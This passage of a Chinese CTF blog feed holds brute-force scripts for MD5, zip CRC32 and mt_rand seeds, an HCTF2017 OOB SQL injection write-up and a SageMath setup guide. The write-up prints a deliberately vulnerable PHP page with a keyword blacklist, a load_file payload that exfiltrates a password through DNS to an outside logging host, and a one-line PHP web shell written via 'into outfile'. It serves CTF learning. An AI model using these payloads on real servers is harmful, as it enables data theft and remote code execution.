Clear_Text_Byte+Clear_Text</div><div class="line"></div><div class="line">            print Clear_Text</div><div class="line">            Known_Byte_IV = &apos;&apos;</div><div class="line">            break</div></pre></td></tr></table></figure></p><p>分三次跑出三组的值，连起来就是flag。<br><br></p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[https://github.com/mpgn/Padding-oracle-attack](https://github.com/mpgn/Padding-oracle-attack)</div><div class="line">[https://github.com/GDSSecurity/PadBuster](https://github.com/GDSSecurity/PadBuster)</div></pre></td></tr></table></figure></p><p>我感觉这种题目还是不适合用工具(因为我也没看懂这些工具怎么用)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;道哥的《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式，据说这货在2011年的Pwnie Rewards上还被评为”最具价值的服务器漏洞”。而且比赛中经常遇到，而且一般都是混在&lt;code&gt;web&lt;/code&gt;题里的&lt;code&gt;crypto&lt;/code&gt;。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>爆破脚本</title>
    <link href="http://Err0rzz.github.io/2017/11/23/%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/"/>
    <id>http://Err0rzz.github.io/2017/11/23/爆破脚本/</id>
    <published>2017-11-23T04:39:56.000Z</published>
    <updated>2017-11-23T04:51:28.142Z</updated>
    
    <content type="html"><![CDATA[<p>有时比赛需要爆破一些东西，比如密钥种子，md5验证这种，觉得还是保存一下脚本代码，遇到的时候就可以直接修改一下用了。</p><a id="more"></a><h1 id="md5验证爆破"><a href="#md5验证爆破" class="headerlink" title="md5验证爆破"></a>md5验证爆破</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf8 -*-</div><div class="line">import hashlib</div><div class="line"> </div><div class="line">def crack_code(code):</div><div class="line">    s = 100000</div><div class="line"> </div><div class="line">    while 1:</div><div class="line">        m2 = hashlib.md5()  </div><div class="line">        m2.update(repr(s))</div><div class="line">        if (m2.hexdigest()[0:4]==code):</div><div class="line">            return s</div><div class="line">            break</div><div class="line">        s+=1</div><div class="line"> </div><div class="line">print crack_code(&apos;818d&apos;)</div></pre></td></tr></table></figure><p><br></p><h1 id="crc爆破"><a href="#crc爆破" class="headerlink" title="crc爆破"></a>crc爆破</h1><p>速度来说，c比python快很多，推荐用c</p><p>python版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">import zipfile,os</div><div class="line">import binascii</div><div class="line">def CRCcheck(crcs):</div><div class="line">for a in r:</div><div class="line">for b in r:</div><div class="line">for c in r:</div><div class="line">for d in r:</div><div class="line">for e in r:</div><div class="line">temp=chr(a)+chr(b)+chr(c)+chr(d)+chr(e);</div><div class="line"></div><div class="line">crc=binascii.crc32(temp);</div><div class="line"></div><div class="line">crc1=crc &amp; 0xFFFFFFFF;</div><div class="line">if (crc1 == crcs)or (hex(crc1)==crcs):</div><div class="line">f.write(temp);</div><div class="line">print &quot;ok&quot;</div><div class="line">return ;</div><div class="line"></div><div class="line">rootname=&apos;C:\\Users\\geqiang\\Desktop\\misc\\zippy&apos;;</div><div class="line">f=open(&quot;F:\\zippy.txt&quot;,&apos;a&apos;);</div><div class="line"></div><div class="line">r=range(32,127);</div><div class="line">for i in range(0,54):</div><div class="line">name=&quot;chunk&quot;+str(i)+&quot;.zip&quot;;</div><div class="line">print name;</div><div class="line">zipFile=zipfile.ZipFile(os.path.join(os.getcwd(), rootname+&quot;\\&quot;+name));</div><div class="line">zipinfo=zipFile.getinfo(&apos;data.txt&apos;);</div><div class="line">crcs=zipinfo.CRC;</div><div class="line">print crcs</div><div class="line">CRCcheck(crcs);</div></pre></td></tr></table></figure></p><p>c版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"># include&lt;string.h&gt;</div><div class="line"># include &lt;stdio.h&gt;</div><div class="line">//来自：https://github.com/ETrun/crc32/blob/master/crc32.c</div><div class="line">static unsigned long Crc32_ComputeBuf(const void *buf, size_t bufLen) &#123;</div><div class="line">static const unsigned long crcTable[256] = &#123;</div><div class="line">0x00000000,0x77073096,0xEE0E612C,0x990951BA,0x076DC419,0x706AF48F,0xE963A535,</div><div class="line">0x9E6495A3,0x0EDB8832,0x79DCB8A4,0xE0D5E91E,0x97D2D988,0x09B64C2B,0x7EB17CBD,</div><div class="line">0xE7B82D07,0x90BF1D91,0x1DB71064,0x6AB020F2,0xF3B97148,0x84BE41DE,0x1ADAD47D,</div><div class="line">0x6DDDE4EB,0xF4D4B551,0x83D385C7,0x136C9856,0x646BA8C0,0xFD62F97A,0x8A65C9EC,</div><div class="line">0x14015C4F,0x63066CD9,0xFA0F3D63,0x8D080DF5,0x3B6E20C8,0x4C69105E,0xD56041E4,</div><div class="line">0xA2677172,0x3C03E4D1,0x4B04D447,0xD20D85FD,0xA50AB56B,0x35B5A8FA,0x42B2986C,</div><div class="line">0xDBBBC9D6,0xACBCF940,0x32D86CE3,0x45DF5C75,0xDCD60DCF,0xABD13D59,0x26D930AC,</div><div class="line">0x51DE003A,0xC8D75180,0xBFD06116,0x21B4F4B5,0x56B3C423,0xCFBA9599,0xB8BDA50F,</div><div class="line">0x2802B89E,0x5F058808,0xC60CD9B2,0xB10BE924,0x2F6F7C87,0x58684C11,0xC1611DAB,</div><div class="line">0xB6662D3D,0x76DC4190,0x01DB7106,0x98D220BC,0xEFD5102A,0x71B18589,0x06B6B51F,</div><div class="line">0x9FBFE4A5,0xE8B8D433,0x7807C9A2,0x0F00F934,0x9609A88E,0xE10E9818,0x7F6A0DBB,</div><div class="line">0x086D3D2D,0x91646C97,0xE6635C01,0x6B6B51F4,0x1C6C6162,0x856530D8,0xF262004E,</div><div class="line">0x6C0695ED,0x1B01A57B,0x8208F4C1,0xF50FC457,0x65B0D9C6,0x12B7E950,0x8BBEB8EA,</div><div class="line">0xFCB9887C,0x62DD1DDF,0x15DA2D49,0x8CD37CF3,0xFBD44C65,0x4DB26158,0x3AB551CE,</div><div class="line">0xA3BC0074,0xD4BB30E2,0x4ADFA541,0x3DD895D7,0xA4D1C46D,0xD3D6F4FB,0x4369E96A,</div><div class="line">0x346ED9FC,0xAD678846,0xDA60B8D0,0x44042D73,0x33031DE5,0xAA0A4C5F,0xDD0D7CC9,</div><div class="line">0x5005713C,0x270241AA,0xBE0B1010,0xC90C2086,0x5768B525,0x206F85B3,0xB966D409,</div><div class="line">0xCE61E49F,0x5EDEF90E,0x29D9C998,0xB0D09822,0xC7D7A8B4,0x59B33D17,0x2EB40D81,</div><div class="line">0xB7BD5C3B,0xC0BA6CAD,0xEDB88320,0x9ABFB3B6,0x03B6E20C,0x74B1D29A,0xEAD54739,</div><div class="line">0x9DD277AF,0x04DB2615,0x73DC1683,0xE3630B12,0x94643B84,0x0D6D6A3E,0x7A6A5AA8,</div><div class="line">0xE40ECF0B,0x9309FF9D,0x0A00AE27,0x7D079EB1,0xF00F9344,0x8708A3D2,0x1E01F268,</div><div class="line">0x6906C2FE,0xF762575D,0x806567CB,0x196C3671,0x6E6B06E7,0xFED41B76,0x89D32BE0,</div><div class="line">0x10DA7A5A,0x67DD4ACC,0xF9B9DF6F,0x8EBEEFF9,0x17B7BE43,0x60B08ED5,0xD6D6A3E8,</div><div class="line">0xA1D1937E,0x38D8C2C4,0x4FDFF252,0xD1BB67F1,0xA6BC5767,0x3FB506DD,0x48B2364B,</div><div class="line">0xD80D2BDA,0xAF0A1B4C,0x36034AF6,0x41047A60,0xDF60EFC3,0xA867DF55,0x316E8EEF,</div><div class="line">0x4669BE79,0xCB61B38C,0xBC66831A,0x256FD2A0,0x5268E236,0xCC0C7795,0xBB0B4703,</div><div class="line">0x220216B9,0x5505262F,0xC5BA3BBE,0xB2BD0B28,0x2BB45A92,0x5CB36A04,0xC2D7FFA7,</div><div class="line">0xB5D0CF31,0x2CD99E8B,0x5BDEAE1D,0x9B64C2B0,0xEC63F226,0x756AA39C,0x026D930A,</div><div class="line">0x9C0906A9,0xEB0E363F,0x72076785,0x05005713,0x95BF4A82,0xE2B87A14,0x7BB12BAE,</div><div class="line">0x0CB61B38,0x92D28E9B,0xE5D5BE0D,0x7CDCEFB7,0x0BDBDF21,0x86D3D2D4,0xF1D4E242,</div><div class="line">0x68DDB3F8,0x1FDA836E,0x81BE16CD,0xF6B9265B,0x6FB077E1,0x18B74777,0x88085AE6,</div><div class="line">0xFF0F6A70,0x66063BCA,0x11010B5C,0x8F659EFF,0xF862AE69,0x616BFFD3,0x166CCF45,</div><div class="line">0xA00AE278,0xD70DD2EE,0x4E048354,0x3903B3C2,0xA7672661,0xD06016F7,0x4969474D,</div><div class="line">0x3E6E77DB,0xAED16A4A,0xD9D65ADC,0x40DF0B66,0x37D83BF0,0xA9BCAE53,0xDEBB9EC5,</div><div class="line">0x47B2CF7F,0x30B5FFE9,0xBDBDF21C,0xCABAC28A,0x53B39330,0x24B4A3A6,0xBAD03605,</div><div class="line">0xCDD70693,0x54DE5729,0x23D967BF,0xB3667A2E,0xC4614AB8,0x5D681B02,0x2A6F2B94,</div><div class="line">0xB40BBE37,0xC30C8EA1,0x5A05DF1B,0x2D02EF8D</div><div class="line">&#125;;</div><div class="line">unsigned long crc32 = 0xFFFFFFFF;</div><div class="line">unsigned char *byteBuf;</div><div class="line">size_t i;</div><div class="line">byteBuf = (unsigned char*)buf;</div><div class="line">for (i = 0; i &lt; bufLen; i++) &#123;</div><div class="line">crc32 = (crc32 &gt;&gt; 8) ^ crcTable[(crc32 ^ byteBuf[i]) &amp; 0xFF];</div><div class="line">&#125;</div><div class="line">return crc32 ^ 0xFFFFFFFF;</div><div class="line">&#125;</div><div class="line">static char *charSet = &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@\n &quot;;</div><div class="line">int main() &#123;</div><div class="line">unsigned long crc32[] = &#123; 1606238046, 1943531056, 3598719407L, 2578797435L, 1405086858, 2143805016, 3234701029L, 3224637410L, </div><div class="line">2346013297L, 1146766327, 4038678768L, 3119445409L, 2111148220, 383413051, 2853461348L, 3176759361L, 1852520927, </div><div class="line">3083243303L, 2151747034L, 1392140456, 544449252, 1871340857, 574988077, 3459049483L, 2786065872L, 3888485555L, </div><div class="line">1716930793, 1933746678, 3178216769L, 3774357278L, 622718466, 1488109481, 525106857, 3123386181L, 3472027048L, </div><div class="line">616379830, 3728848209L, 1358333123, 1852520927, 3096466191L, 622718466</div><div class="line">&#125;;</div><div class="line">char tmp[6] = &quot;&quot;;</div><div class="line">int len = strlen(charSet);</div><div class="line">for (int h = sizeof(crc32) / sizeof(unsigned long) - 1;h&gt;=0; h--) &#123;</div><div class="line">for (int a = 0; a &lt; len; a++) &#123;</div><div class="line">tmp[0] = charSet[a];</div><div class="line">for (int b = 0; b &lt; len; b++) &#123;</div><div class="line">tmp[1] = charSet[b];</div><div class="line">for (int c = 0; c &lt; len; c++) &#123;</div><div class="line">tmp[2] = charSet[c];</div><div class="line">for (int d = 0; d &lt; len; d++) &#123;</div><div class="line">tmp[3] = charSet[d];</div><div class="line">for (int e = 0; e &lt; len; e++) &#123;</div><div class="line">tmp[4] = charSet[e];</div><div class="line">if (Crc32_ComputeBuf(tmp, strlen(tmp)) == crc32[h]) &#123;</div><div class="line">printf(&quot;%s&quot;, tmp);</div><div class="line">//goto label;//若是存在碰撞，那么这里可以将这里注释掉</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">label :;</div><div class="line">printf(&quot;\n&quot;);</div><div class="line">&#125;</div><div class="line">return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><br></p><h1 id="种子密钥爆破"><a href="#种子密钥爆破" class="headerlink" title="种子密钥爆破"></a>种子密钥爆破</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">function auth_code($length = 12, $special = true)</div><div class="line">&#123;</div><div class="line">    $chars = </div><div class="line">&apos;abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;;</div><div class="line">    if ($special) &#123;</div><div class="line">        echo 1;</div><div class="line">        $chars .= &apos;!@#$%^&amp;*()&apos;;</div><div class="line">    &#125;</div><div class="line">    $password = &apos;&apos;;</div><div class="line">    for ($i = 0; $i &lt; $length; $i++) &#123;</div><div class="line">        $password .= substr($chars, mt_rand(0, strlen($chars) ‐ 1), 1);</div><div class="line">    &#125;</div><div class="line">    return $password;</div><div class="line">&#125;</div><div class="line">while(True)</div><div class="line">&#123;</div><div class="line">    $seed = rand(0,99999);</div><div class="line">    mt_srand($seed);</div><div class="line">    $key = auth_code(16, false);    if($key == &quot;k Cfnh ISk Ty Ip4a Ae&quot;)</div><div class="line">    &#123;</div><div class="line">        echo $seed;</div><div class="line">        echo &quot;\n&quot;;</div><div class="line">        break;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$private = auth_code(10, false);</div><div class="line">echo $private;</div><div class="line">echo &quot;\n&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有时比赛需要爆破一些东西，比如密钥种子，md5验证这种，觉得还是保存一下脚本代码，遇到的时候就可以直接修改一下用了。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>OOB注入</title>
    <link href="http://Err0rzz.github.io/2017/11/16/OOB%E6%B3%A8%E5%85%A5/"/>
    <id>http://Err0rzz.github.io/2017/11/16/OOB注入/</id>
    <published>2017-11-16T11:52:06.000Z</published>
    <updated>2018-01-09T06:10:10.714Z</updated>
    
    <content type="html"><![CDATA[<p>源于HCTF2017的一道题目，看来自己还是太年轻了，这种注入自己以前一直没见过，然后一搜一大把。</p><a id="more"></a><p>SQL注入类型细分，分为以下5种：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1. Boolean-based blind SQL injection </div><div class="line">2. Error-based SQL injection</div><div class="line">3. UNION query SQL injection</div><div class="line">4. Stacked queries SQL injection</div><div class="line">5. Time-based blind SQL injection</div></pre></td></tr></table></figure></p><p>共计3大类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. inband</div><div class="line">2. inference</div><div class="line">3. out of band(OOB)</div></pre></td></tr></table></figure></p><p><strong>OOB</strong>与我们熟知的inband类的注入相反。inband是利用web应用来直接获取数据，比如Error-based SQL injection和UNION query SQL injection都是属于inband类，它们都是通过web的响应或者错误反馈来提取数据。</p><p>而inference则是通过web的一些反映来推断数据，比如Boolean-based blind SQL injection和Stacked queries SQL injection 也就是我们通俗的盲注，通过web应用的其他改变来推断数据。</p><p>我们的主角OOB则是通过其他传输方式来获得数据，比如利用我们等会要说到的DNS解析协议和电子邮件。当你遇到了某些很隐蔽的注入点，inband类注入没办法用，inference类注入被你嫌弃太慢的时候，OOB就是你最好的选择了。</p><p>如何查看mysql是否开启了文件导入导出？<br><code>mysql&gt;show global variables like &#39;%secure%&#39;;</code><br>如果<code>secure_file_priv</code>的值为<code>null</code>，则没开启；如果为空，则开启；如果为目录，则说明只能在该目录下操作。</p><p>如何修改<code>secure_file_priv</code>？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">windows下：修改my.ini 在[mysqld]内加入secure_file_priv =</div><div class="line">linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</div><div class="line">MYSQL新特性secure_file_priv对读写文件的影响</div><div class="line">然后重启mysql，再查询secure_file_priv</div></pre></td></tr></table></figure></p><p>原理什么的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[http://bobao.360.cn/learning/detail/3458.html](http://bobao.360.cn/learning/detail/3458.html)</div><div class="line">[http://www.freebuf.com/vuls/138838.html](http://www.freebuf.com/vuls/138838.html)</div><div class="line">[http://www.jianshu.com/p/95c814c515a2](http://www.jianshu.com/p/95c814c515a2)</div></pre></td></tr></table></figure></p><p>大致就是如果目标服务器是搭在win下，且有能操控文件的函数，且配置不当，如mysql中的<strong>secure_file_priv</strong>全局系统变量配置问题，就有可能会触发<strong>OOB注入</strong>。注入过程呢，是通过那些函数，例如load_file()去发送DNS请求，然后将我们的查询语句构造在DNS查询中，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">利用payload是：load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\abc&apos;))</div><div class="line">concat是字符串拼接</div><div class="line">database()就是你要做SQL注入查询的地方</div><div class="line">&apos;.xxxx.ceye.io\abc&apos;就是你的dnslog平台给你的域名</div><div class="line">后面的abc可以改也可以不改，无所谓的，你乐意写啥就写啥</div></pre></td></tr></table></figure></p><p>这里的域名是在<a href="http://ceye.io/" target="_blank" rel="external">http://ceye.io/</a>中注册得到的。</p><h1 id="boring-website"><a href="#boring-website" class="headerlink" title="boring website"></a>boring website</h1><p>这是HCTF2017的一道题目。<br>题目：<a href="https://github.com/hammerorz/HCTF2017-easy-sign-and-boring-website" target="_blank" rel="external">https://github.com/hammerorz/HCTF2017-easy-sign-and-boring-website</a><br>wp：<a href="https://xianzhi.aliyun.com/forum/topic/1589/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1589/</a></p><p>知道了这个注入之后就很好做了，直接抄wp了</p><p>发现应该是<code>sql server</code>用<code>linkserver</code>来连接<code>mysql</code>。所以去查了一波<code>linkserver</code>的用法，以及结合注释可得<code>select * from openquery(mysql,&#39;select xxx&#39;)</code>可以从<code>mysql</code>数据库中查得信息，但是没有回显，<code>sleep</code>函数也被ban了，然后看到oob的提示，去查了一波<code>mysql out-of-band</code>，发现<code>load_file</code>函数可以通过dns通道把所查得的数据带出来。接下来的过程就是十分常见简单的mysql注入的流程。</p><p>这里值得另外一提的是，本来不知道原来还能用<code>openquery</code>来进行连接不同的服务器，又学到了。</p><p>我将题目重新搭了一下，不过因为本地没有安装sql server，所以就没有搭sql servser环境，只是复现了<code>load_file</code>的<code>dns</code>查询。而一开始没有成功，发现是少了配置条件，没有配置<strong>secure-file-priv</strong>。截图如下：</p><p><strong>本地数据库信息</strong><br><img src="https://i.imgur.com/Kt2bOVq.png" alt=""></p><p><strong>重新搭的题目源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$conn=@mysql_connect(&quot;localhost&quot;,&apos;root&apos;,&apos;root&apos;) or die(&quot;数据库连接失败！&quot;);;</div><div class="line"></div><div class="line">#echo &quot;Connected to MySQL&lt;br /&gt;&quot;;</div><div class="line">echo &quot;Connected to MYSQL&lt;br /&gt;&quot;;</div><div class="line"></div><div class="line">mysql_select_db(&quot;sql4&quot;,$conn) or die(&quot;您要选择的数据库不存在&quot;);</div><div class="line">if(isset($_GET[&apos;id&apos;]))&#123;</div><div class="line">$id = $_GET[&apos;id&apos;];</div><div class="line">if(preg_match(&apos;/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare</div><div class="line">|if|insert|into|outfile|dumpfile|sleep|wait|benchmark/i&apos;, $id)) &#123;</div><div class="line">die(&apos;stupid hacker&apos;);</div><div class="line">&#125;</div><div class="line">$query = &quot;select username from not_here where id = $id&quot;; </div><div class="line">$stmt = mysql_query( $query );</div><div class="line">$arr=@mysql_fetch_array($query);</div><div class="line"></div><div class="line">if (is_array($arr))&#123;</div><div class="line">//TO DO: ...</div><div class="line">//It&apos;s time to sleep...</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">else print(&quot;?id&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p><strong>payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=8 union select load_file(concat(&quot;\\\\&quot;,(select password from secret),&quot;.3g3dxq.ceye.io\\abc&quot;))</div></pre></td></tr></table></figure></p><p><strong>结果</strong><br><img src="https://i.imgur.com/Tro5zcn.jpg" alt=""></p><p><strong>PS:</strong><br>在搜索这些函数的时候，学会一个新姿势,算是意外之喜吧。用mysql写一句话:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select &apos;&lt;?php eval($_POST[cmd])?&gt;&apos; into outfile &apos;D:/PHPnow-1.5.4/htdocs/index2.php&apos;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;源于HCTF2017的一道题目，看来自己还是太年轻了，这种注入自己以前一直没见过，然后一搜一大把。&lt;/p&gt;
    
    </summary>
    
    
      <category term="注入" scheme="http://Err0rzz.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sage安装</title>
    <link href="http://Err0rzz.github.io/2017/11/16/sage%E5%AE%89%E8%A3%85/"/>
    <id>http://Err0rzz.github.io/2017/11/16/sage安装/</id>
    <published>2017-11-16T05:42:41.000Z</published>
    <updated>2017-11-16T05:59:13.078Z</updated>
    
    <content type="html"><![CDATA[<p>Sage可以干什么？介绍中有这么一句：“这款开源软件的支持者称Sage能够完成从12维物体到计算全球变暖效应数学模型中的降雨量的任何事情。”Sage包含了从线性代数、微积分，到密码学、数值计算、组合数学、群论、图论、数论等各种初高等数学的计算功能。</p><a id="more"></a><p>Sage的一大特点是整合了众多优秀的开源数学软件，使用户可以在Sage中方便的使用这些库中的相应功能。Sage目前整合了近一百个开源的数学库，这其中包括著名的ATLAS、BLAS、LAPACK、Boost、GSL、SciPy等等，完整列表可以查看这里。</p><p>Sage基于并使用Python，Python程序可以在Sage中直接运行，也可以在Sage中使用Python的各种库，感觉就像是提供了一个包含各种数学功能的Python环境。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>这里介绍linux下的安装。<br>官网下载地址：<a href="http://www.sagemath.org/" target="_blank" rel="external">http://www.sagemath.org/</a><br>根据自己的环境找到安装包，我这里安装的是<a href="http://mirror.hust.edu.cn/sagemath/linux/64bit/index.html" target="_blank" rel="external">http://mirror.hust.edu.cn/sagemath/linux/64bit/index.html</a>下的64位的包。</p><p>下载好之后用以下命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tar xvf sage-8.0-Ubuntu_16.04-x86_64.tar.bz2</div><div class="line">cd SageMath</div></pre></td></tr></table></figure></p><p>然后就能使用sage工具了，使用命令如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ ./sage</div><div class="line"></div><div class="line">Rewriting paths for your new installation directory</div><div class="line">===================================================</div><div class="line"></div><div class="line">This might take a few minutes but only has to be done once.</div><div class="line"></div><div class="line">patching /home/user/tmp/SageMath/src/build/cythonized/sage/structure/list_clone.c</div><div class="line">(snip)</div><div class="line">patching /home/user/tmp/SageMath/src/build/cython_debug/cython_debug_info_sage.gsl.ode</div><div class="line">┌────────────────────────────────────────────────────────────────────┐</div><div class="line">│ SageMath Version 6.10, Release Date: 2015-12-18                    │</div><div class="line">│ Type &quot;notebook()&quot; for the browser-based notebook interface.        │</div><div class="line">│ Type &quot;help()&quot; for help.                                            │</div><div class="line">└────────────────────────────────────────────────────────────────────┘</div><div class="line">sage:</div></pre></td></tr></table></figure></p><p>这样是用交互式来使用sage。</p><p>如果是想使用<code>.sage</code>代码的话，直接执行以下命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./sage ***.sage</div></pre></td></tr></table></figure></p><p>即可运行sage文件</p><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p>这里介绍<strong>Coppersmith partial information attack</strong>这种算法的sage代码的payload，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">p4 = 0xf3a5f928e11c5901f9f4289e513f046748efb99d4f8e706e207a943e1d2c9df43feab38e20c2106d87167e5501ac41adfc4912732457103a4359e5b433da78f39ad6f206b8f170192aa0841feb501ce1</div><div class="line">n = 0x7e7007c7c85788b9b77cda64c9b3f5d2a795fe1b1f8d3f120288a30a168c3ea932c7574700ff0f596c5ad04a703756aedc66b9b9e44911d55f0a72a1cc1a569cee02a84499cdb091b8471a8e6cc0ebca583dfd6fb8d5fecf32ff67d2ddeaaaaf9c71a10009b4218fc57743675f283d22734ac7ade2ca240772d11b5783755378f7c30988f41d4a9d62561ea6e5f2f21d3d44e8689e781d3f61356123929457d17b07a1d04741bf970afb590cd820dd12cf88f68b0e896388f433fd2adf3354353c9c56abb0cfea223387e6d0b2df10e450c621ac153e47369f888fdc0b39c842a5ddc6a11339862ccdb4be97a81445205fb8f8bde9daaad5d0dc2ea5bd3b8c43</div><div class="line"></div><div class="line">pbits = 1024</div><div class="line">kbits = pbits - p4.nbits()</div><div class="line">print p4.nbits()</div><div class="line">p4 = p4 &lt;&lt; kbits</div><div class="line"></div><div 